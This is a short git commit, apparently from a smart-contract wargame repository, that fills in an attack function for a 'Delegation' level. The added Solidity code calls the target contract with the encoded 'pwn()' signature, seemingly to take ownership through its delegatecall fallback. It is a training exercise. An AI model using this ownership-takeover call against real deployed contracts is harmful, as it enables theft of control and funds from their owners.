9288708594e31ce4bbef37cd3b6fc090461e9e41
ganzai-san <ganzai@protonmail.com>
2022-04-02 15:04:23 -0400

    delegation hack

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -10,6 +10,9 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success, ) = contractAddress.call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success, "receiver got hacked");
     }
 }
